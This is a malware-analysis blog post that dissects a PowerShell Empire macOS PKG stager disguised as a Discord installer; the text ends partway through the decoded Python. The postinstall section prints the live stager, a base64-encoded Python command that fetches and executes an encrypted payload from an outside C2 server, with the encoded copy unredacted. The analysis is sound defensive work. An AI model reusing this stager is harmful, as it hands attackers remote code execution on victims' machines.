<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Analyzing an Empire macOS PKG Stager" /><meta property="og:locale" content="en" /><meta name="description" content="Command and control (C2) frameworks often support multiple platforms, and PowerShell Empire is no different. In older days, there was a Python Empyre version that eventually merged into the full Empire project and support for macOS and Linux systems still exists within Empire. For these platforms, Empire leverages python-based launchers to execute commands. While the Python launchers may be platform independent, adversaries must still deliver them to victim hosts. This delivery presents an excellent opportunity for detection and analysis. For this example, we’re going to walk through the analysis of an Empire stager found in VirusTotal: https://www.virustotal.com/gui/file/19e19adc03b313236462b30a1a438a604d4c0b4c86268b951689696144a63fdc/detection." /><meta property="og:description" content="Command and control (C2) frameworks often support multiple platforms, and PowerShell Empire is no different. In older days, there was a Python Empyre version that eventually merged into the full Empire project and support for macOS and Linux systems still exists within Empire. For these platforms, Empire leverages python-based launchers to execute commands. While the Python launchers may be platform independent, adversaries must still deliver them to victim hosts. This delivery presents an excellent opportunity for detection and analysis. For this example, we’re going to walk through the analysis of an Empire stager found in VirusTotal: https://www.virustotal.com/gui/file/19e19adc03b313236462b30a1a438a604d4c0b4c86268b951689696144a63fdc/detection." /><link rel="canonical" href="https://forensicitguy.github.io/analyzing-empire-macos-pkg-stager/" /><meta property="og:url" content="https://forensicitguy.github.io/analyzing-empire-macos-pkg-stager/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-02-08T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Analyzing an Empire macOS PKG Stager" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-28T23:09:20+00:00","datePublished":"2021-02-08T00:00:00+00:00","description":"Command and control (C2) frameworks often support multiple platforms, and PowerShell Empire is no different. In older days, there was a Python Empyre version that eventually merged into the full Empire project and support for macOS and Linux systems still exists within Empire. For these platforms, Empire leverages python-based launchers to execute commands. While the Python launchers may be platform independent, adversaries must still deliver them to victim hosts. This delivery presents an excellent opportunity for detection and analysis. For this example, we’re going to walk through the analysis of an Empire stager found in VirusTotal: https://www.virustotal.com/gui/file/19e19adc03b313236462b30a1a438a604d4c0b4c86268b951689696144a63fdc/detection.","headline":"Analyzing an Empire macOS PKG Stager","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/analyzing-empire-macos-pkg-stager/"},"url":"https://forensicitguy.github.io/analyzing-empire-macos-pkg-stager/"}</script><title>Analyzing an Empire macOS PKG Stager | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tony Lambert</a></div><div class="site-subtitle font-italic">An educator that does security things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener"> <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Analyzing an Empire macOS PKG Stager</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Analyzing an Empire macOS PKG Stager</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1612742400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-02-08 </em> </span> <span> Updated <em class="timeago" data-ts="1648508960" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-28 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1686 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><p>Command and control (C2) frameworks often support multiple platforms, and PowerShell Empire is no different. In older days, there was a Python Empyre version that eventually merged into the full Empire project and support for macOS and Linux systems still exists within Empire. For these platforms, Empire leverages python-based launchers to execute commands. While the Python launchers may be platform independent, adversaries must still deliver them to victim hosts. This delivery presents an excellent opportunity for detection and analysis. For this example, we’re going to walk through the analysis of an Empire stager found in VirusTotal: <a href="https://www.virustotal.com/gui/file/19e19adc03b313236462b30a1a438a604d4c0b4c86268b951689696144a63fdc/detection">https://www.virustotal.com/gui/file/19e19adc03b313236462b30a1a438a604d4c0b4c86268b951689696144a63fdc/detection</a>.</p><h2 id="inspecting-the-pkg-file"><span class="mr-2">Inspecting The PKG File</span><a href="#inspecting-the-pkg-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>For this analysis, we’ll work from a REMnux v7 host. To start off, let’s make sure we have a working folder for files.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> ~/cases/empire-stager/stager
<span class="nv">$ </span><span class="nb">mv</span> ~/Downloads/discord.pkg empire-stager/
<span class="nv">$ </span><span class="nb">cd </span>empire-stager/
<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>

total 48K
drwxrwxr-x 3 remnux remnux 4.0K Feb  8 23:38 <span class="nb">.</span>
drwxrwxr-x 9 remnux remnux 4.0K Feb  8 23:37 ..
<span class="nt">-rw-rw-r--</span> 1 remnux remnux  35K Feb  7 01:30 discord.pkg
drwxrwxr-x 2 remnux remnux 4.0K Feb  8 23:37 stager
</pre></table></code></div></div><p>The PKG file masquerades as a component related to the Discord application, possibly the installer. To proceed we can go ahead and get an idea of the file type using the <code class="language-plaintext highlighter-rouge">file</code> command.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file discord.pkg

discord.pkg: xar archive compressed TOC: 2674, SHA-1 checksum
</pre></table></code></div></div><p>The output indicates the PKG file is a XAR archive, exactly what we expect for a PKG file.</p><p>Moving forward, we can unpack the PKG using <code class="language-plaintext highlighter-rouge">bsdtar</code>.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nv">$ </span>bsdtar xvf discord.pkg <span class="nt">-C</span> stager/

x Resources
x Resources/ru-RU.lproj
x Distribution
x update.pkg
x update.pkg/PackageInfo
x update.pkg/Bom
x update.pkg/Payload
x update.pkg/Scripts

<span class="nv">$ </span><span class="nb">cd </span>stager/
<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>

total 20K
drwxrwxr-x 4 remnux remnux 4.0K Feb  8 23:44 <span class="nb">.</span>
drwxrwxr-x 3 remnux remnux 4.0K Feb  8 23:38 ..
<span class="nt">-rw-r--r--</span> 1 remnux remnux 1.8K Nov 27  2019 Distribution
drwxr-xr-x 3 remnux remnux 4.0K Nov 27  2019 Resources
drwxr-xr-x 2 remnux remnux 4.0K Nov 27  2019 update.pkg
</pre></table></code></div></div><p>Within the Resources folder there is a <code class="language-plaintext highlighter-rouge">ru-RU.lproj</code> file. From the naming convention we can hypothesize it has something to do with language resources, but we can’t be sure because the folder is empty upon inspection.</p><p>Next, we can inspect the contents of the <code class="language-plaintext highlighter-rouge">update.pkg</code> folder. As seen in the output of <code class="language-plaintext highlighter-rouge">bsdtar</code>, it contains just a few files:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>

total 84K
drwxr-xr-x 2 remnux remnux 4.0K Nov 27  2019 <span class="nb">.</span>
drwxrwxr-x 4 remnux remnux 4.0K Feb  8 23:44 ..
<span class="nt">-rw-r--r--</span> 1 remnux remnux  35K Nov 27  2019 Bom
<span class="nt">-rw-r--r--</span> 1 remnux remnux  777 Nov 27  2019 PackageInfo
<span class="nt">-rw-r--r--</span> 1 remnux remnux  29K Nov 27  2019 Payload
<span class="nt">-rw-r--r--</span> 1 remnux remnux  917 Nov 27  2019 Scripts

<span class="nv">$ </span>file <span class="k">*</span>

Bom:         Mac OS X bill of materials <span class="o">(</span>BOM<span class="o">)</span> file
PackageInfo: ASCII text
Payload:     <span class="nb">gzip </span>compressed data, from Unix, original size modulo 2^32 77824
Scripts:     <span class="nb">gzip </span>compressed data, from Unix, original size modulo 2^32 1536
</pre></table></code></div></div><p>From the directory structure and file types, it seems the contents match what we would expect from a macOS PKG file. There is a Bill of Materials (BOM) file, PackageInfo in text/XML format, and two gzipped CPIO archives: Payload and Scripts. Before unpacking the Payload and Scripts, we can inspect the PackageInfo file with <code class="language-plaintext highlighter-rouge">less</code>.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nv">$ </span>less PackageInfo

&lt;pkg-info format-version<span class="o">=</span><span class="s2">"2"</span> <span class="nv">identifier</span><span class="o">=</span><span class="s2">"com.apple.Discord"</span> <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> install-location<span class="o">=</span><span class="s2">"/"</span> <span class="nv">auth</span><span class="o">=</span><span class="s2">"root"</span> overwrite-permissions<span class="o">=</span><span class="s2">"true"</span> generator-version<span class="o">=</span><span class="s2">"InstallCmds-554 (15G31)"</span><span class="o">&gt;</span>
    &lt;payload <span class="nv">numberOfFiles</span><span class="o">=</span><span class="s2">"15"</span> <span class="nv">installKBytes</span><span class="o">=</span><span class="s2">"105"</span>/&gt;
    &lt;scripts&gt;
        &lt;postinstall <span class="nv">file</span><span class="o">=</span><span class="s2">"./postinstall"</span>/&gt;
    &lt;/scripts&gt;
    &lt;bundle <span class="nb">id</span><span class="o">=</span><span class="s2">"com.apple.Discord"</span> <span class="nv">CFBundleIdentifier</span><span class="o">=</span><span class="s2">"com.apple.Discord"</span> <span class="nv">path</span><span class="o">=</span><span class="s2">"./Discord.app"</span> <span class="nv">CFBundleShortVersionString</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">CFBundleVersion</span><span class="o">=</span><span class="s2">"1"</span>/&gt;
    &lt;bundle-version&gt;
        &lt;bundle <span class="nb">id</span><span class="o">=</span><span class="s2">"com.apple.Discord"</span>/&gt;
    &lt;/bundle-version&gt;
    &lt;upgrade-bundle&gt;
        &lt;bundle <span class="nb">id</span><span class="o">=</span><span class="s2">"com.apple.Discord"</span>/&gt;
    &lt;/upgrade-bundle&gt;
    &lt;update-bundle/&gt;
    &lt;atomic-update-bundle/&gt;
    &lt;strict-identifier&gt;
        &lt;bundle <span class="nb">id</span><span class="o">=</span><span class="s2">"com.apple.Discord"</span>/&gt;
    &lt;/strict-identifier&gt;
&lt;/pkg-info&gt;
</pre></table></code></div></div><p>There are a few things to note from this file. First, the PackageInfo file doubles down on the masquerade that the PKG file is related to Discord. Next, the <code class="language-plaintext highlighter-rouge">installKBytes</code> field contains a value <code class="language-plaintext highlighter-rouge">105</code>. This gives us reasonable evidence to assume the Payloads archive will contain some form of content. In payload-free package files, the <code class="language-plaintext highlighter-rouge">installKBytes</code> field will contain the value <code class="language-plaintext highlighter-rouge">0</code>, indicating all the work is done by preinstall and postinstall scripts.</p><p>Finally, the <code class="language-plaintext highlighter-rouge">scripts</code> section of the PackageInfo file indicates we can expect Scripts to unpack a postintall script for execution. This postinstall script should execute after the macOS Installer utility processes the content of the PKG file and after the “installation” is complete. In legitimate use cases, applications would take this opportunity to use postinstall scripts to clean up unneeded files. In this case, the postinstall script executes malware.</p><h2 id="unpacking-the-malicious-content"><span class="mr-2">Unpacking the Malicious Content</span><a href="#unpacking-the-malicious-content" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now we can unpack the Payload and Scripts archives.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>Payload | <span class="nb">gunzip</span> | cpio <span class="nt">-i</span>
152 blocks
<span class="nv">$ </span><span class="nb">cat </span>Scripts | <span class="nb">gunzip</span> | cpio <span class="nt">-i</span>
3 blocks

<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>
total 92K
drwxr-xr-x 3 remnux remnux 4.0K Feb  9 00:01 <span class="nb">.</span>
drwxrwxr-x 4 remnux remnux 4.0K Feb  8 23:44 ..
drwxr-xr-x 3 remnux remnux 4.0K Feb  9 00:01 Applications
<span class="nt">-rw-r--r--</span> 1 remnux remnux  35K Nov 27  2019 Bom
<span class="nt">-rw-r--r--</span> 1 remnux remnux  777 Nov 27  2019 PackageInfo
<span class="nt">-rw-r--r--</span> 1 remnux remnux  29K Nov 27  2019 Payload
<span class="nt">-rwxr-xr-x</span> 1 remnux remnux 1.1K Feb  9 00:01 postinstall
<span class="nt">-rw-r--r--</span> 1 remnux remnux  917 Nov 27  2019 Scripts

<span class="nv">$ </span>file postinstall 
postinstall: Bourne-Again shell script, ASCII text executable, with very long lines
</pre></table></code></div></div><p>Now the postinstall script is unpacked, we can recognize its file type as a Bash script. This is important to note as a postinstall script can be written in any scripting language for which the system contains an interpreter. In some packages, I’ve also seen postinstall to be a Mach-O binary instead of a script. To see the contents of postinstall, we can use the <code class="language-plaintext highlighter-rouge">less</code> command again.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>less postinstall

<span class="c">#!/bin/bash</span>

<span class="nb">echo</span> <span class="s2">"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xNzYuMTI2LjcwLjEzMjoxMDAwMSc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJztyZXE9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb2tpZScsInNlc3Npb249cUc5WlFZWFdlMEk1cG15dFpFMU4wdkFxbTljPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJzBlZjk2NzMyNzg5NzE4NTI1ZTc2MzgyOTM3MGJkNDg4JztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ=='));"</span> | /usr/bin/python &amp;

<span class="nb">exit </span>0
</pre></table></code></div></div><p>The postinstall script contains base64-encoded Python commands. We know they’re base64-encoded because they’ll be decoded at runtime using the functions <code class="language-plaintext highlighter-rouge">base64.b64decode</code> and executed with <code class="language-plaintext highlighter-rouge">exec</code>. In addition, the stager uses an <code class="language-plaintext highlighter-rouge">echo</code> command to pass the code into a <code class="language-plaintext highlighter-rouge">python</code> process. This is an evasion method, ensuring that process monitoring software such as EDR won’t notice Python having suspicious command line parameters. Since the code is in base64, we can easily decode it with the command <code class="language-plaintext highlighter-rouge">base64 -d</code> and write it to a plaintext file.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xNzYuMTI2LjcwLjEzMjoxMDAwMSc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJztyZXE9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb2tpZScsInNlc3Npb249cUc5WlFZWFdlMEk1cG15dFpFMU4wdkFxbTljPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJzBlZjk2NzMyNzg5NzE4NTI1ZTc2MzgyOTM3MGJkNDg4JztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ=="</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> python-stager.txt
</pre></table></code></div></div><h2 id="analyzing-the-python-code"><span class="mr-2">Analyzing The Python Code</span><a href="#analyzing-the-python-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="nv">$ </span>less python-stager.txt

import sys<span class="p">;</span>import urllib2<span class="p">;</span>
<span class="nv">UA</span><span class="o">=</span><span class="s1">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span><span class="p">;</span><span class="nv">server</span><span class="o">=</span><span class="s1">'hxxp://176.126.70[.]xxx:10001'</span><span class="p">;</span><span class="nv">t</span><span class="o">=</span><span class="s1">'/login/process.php'</span><span class="p">;</span><span class="nv">req</span><span class="o">=</span>urllib2.Request<span class="o">(</span>server+t<span class="o">)</span><span class="p">;</span>
req.add_header<span class="o">(</span><span class="s1">'User-Agent'</span>,UA<span class="o">)</span><span class="p">;</span>
req.add_header<span class="o">(</span><span class="s1">'Cookie'</span>,<span class="s2">"session=qG9ZQYXWe0I5pmytZE1N0vAqm9c="</span><span class="o">)</span><span class="p">;</span>
proxy <span class="o">=</span> urllib2.ProxyHandler<span class="o">()</span><span class="p">;</span>
o <span class="o">=</span> urllib2.build_opener<span class="o">(</span>proxy<span class="o">)</span><span class="p">;</span>
urllib2.install_opener<span class="o">(</span>o<span class="o">)</span><span class="p">;</span>
<span class="nv">a</span><span class="o">=</span>urllib2.urlopen<span class="o">(</span>req<span class="o">)</span>.read<span class="o">()</span><span class="p">;</span>
<span class="nv">IV</span><span class="o">=</span>a[0:4]<span class="p">;</span><span class="nv">data</span><span class="o">=</span>a[4:]<span class="p">;</span><span class="nv">key</span><span class="o">=</span>IV+<span class="s1">'0ef96732789718525e763829370bd488'</span><span class="p">;</span>S,j,out<span class="o">=</span>range<span class="o">(</span>256<span class="o">)</span>,0,[]
<span class="k">for </span>i <span class="k">in </span>range<span class="o">(</span>256<span class="o">)</span>:
    <span class="nv">j</span><span class="o">=(</span>j+S[i]+ord<span class="o">(</span>key[i%len<span class="o">(</span>key<span class="o">)]))</span>%256
    S[i],S[j]<span class="o">=</span>S[j],S[i]
<span class="nv">i</span><span class="o">=</span><span class="nv">j</span><span class="o">=</span>0
<span class="k">for </span>char <span class="k">in </span>data:
    <span class="nv">i</span><span class="o">=(</span>i+1<span class="o">)</span>%256
